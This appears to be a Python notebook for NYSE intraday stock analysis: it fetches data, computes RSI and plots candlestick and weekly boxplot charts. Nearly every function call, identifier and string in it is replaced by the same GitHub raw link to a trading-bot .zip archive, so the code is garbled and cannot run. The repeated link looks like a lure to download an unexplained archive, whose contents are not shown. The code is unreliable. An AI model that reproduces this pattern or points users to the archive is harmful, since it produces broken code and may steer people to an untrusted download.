response = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(url)
data = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
df = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(data)

# Convert and sort data
df['date'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(df['date'])
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('date', inplace=True)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('date', inplace=True)

# Calculate RSI
delta = df['close'].diff()
gain = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(lower=0)
loss = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(upper=0)
avg_gain = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(RSI_PERIOD).mean()
avg_loss = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(RSI_PERIOD).mean()
rs = avg_gain / avg_loss
df['RSI'] = 100 - (100 / (1 + rs))

# Plot RSI with Plotly
fig = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()

# RSI Line
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip,
    y=df['RSI'],
    mode='lines',
    name='RSI',
    line=dict(color='dodgerblue', width=2)
))

# Overbought line (70)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    x=[https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[0], https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[-1]],
    y=[70, 70],
    mode='lines',
    name='Overbought (70)',
    line=dict(color='red', width=1, dash='dash'),
    showlegend=True
))

# Oversold line (30)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    x=[https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[0], https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[-1]],
    y=[30, 30],
    mode='lines',
    name='Oversold (30)',
    line=dict(color='green', width=1, dash='dash'),
    showlegend=True
))

# Text annotations
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[-1], y=70, text="Overbought", showarrow=False, font=dict(color="red"))
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[-1], y=30, text="Oversold", showarrow=False, font=dict(color="green"))

# Layout
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    title=f"RSI Chart for {symbol}",
    xaxis_title="Date",
    yaxis_title="RSI",
    legend=dict(x=0.01, y=0.99, bgcolor="rgba(0,0,0,0)", font=dict(size=10)),
    template="simple_white",
    height=500
)

https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()



# Configuration
symbol = "https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
interval = "15m"
range_days = "90d"
api_key = "__________________"   # Replace with your actual API Key
from_date_str = '01-01-2025'     # MM-DD-Y (yyyy)
to_date_str   = '31-03-2025'     # MM-DD-Y (yyyy)

url = f"https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
# Fetch data
response = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(url)
data = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()

# Check structure
print("Sample record from response:")
print(data[:5]) # Preview first 5 sliced entry


# Convert to DataFrame
df = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(data)
df['date'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(df['date'])  # Correct column name
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('date', inplace=True)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(inplace=True)


# Plot candlestick chart
fig = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(data=[https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip,
    open=df['open'],
    high=df['high'],
    low=df['low'],
    close=df['close'],
    increasing_line_color='green',
    decreasing_line_color='red'
)])

https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(
    title=f'{symbol} Intraday Candlestick Chart ({interval})',
    xaxis_title='Time',
    yaxis_title='Price',
    xaxis_rangeslider_visible=False,
    template='seaborn',
    height=600
)

https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()



# Configuration
symbol = "https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
interval = "30m"
range_days = "90d"
api_key = "________________________________"   # Replace with your actual API Key
from_date_str = '01-01-2025'     # MM-DD-Y (yyyy)
to_date_str   = '31-03-2025'     # MM-DD-Y (yyyy)

url = f"https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
# Fetch data
response = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(url)
data = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()

# === API REQUEST ===
url = f"https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
response = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(url)

# === ERROR HANDLING ===
if https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip != 200:
    raise Exception(f"API request failed with status {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip}: {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip}")

# === PARSE JSON TO DATAFRAME ===
data = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
df = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(data)

df['date'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(df['date'])
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('date', inplace=True)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(inplace=True)


# === GROUP BY WEEK ===
df['week'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('W')
weekly_close = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('week')['close'].apply(list)

# === PREPARE DATA FOR BOXPLOT ===
box_data = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
week_labels = [str(week) for week in https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip]

# === PLOT BOXPLOT ===
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(figsize=(14, 6))
box = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(box_data, patch_artist=True)

# === COLOR STYLING ===
colors = ['lightblue', 'lightgreen', 'lightcoral', 'wheat', 'lavender']
for patch, color in zip(box['boxes'], colors * (len(box['boxes']) // len(colors) + 1)):
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(color)

https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(f'Weekly Closing Price Distribution for {symbol}', fontsize=16)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('Week')
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('Closing Price')
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(ticks=range(1, len(week_labels)+1), labels=week_labels, rotation=45, fontsize=9)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(axis='y', linestyle='--', alpha=0.7)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
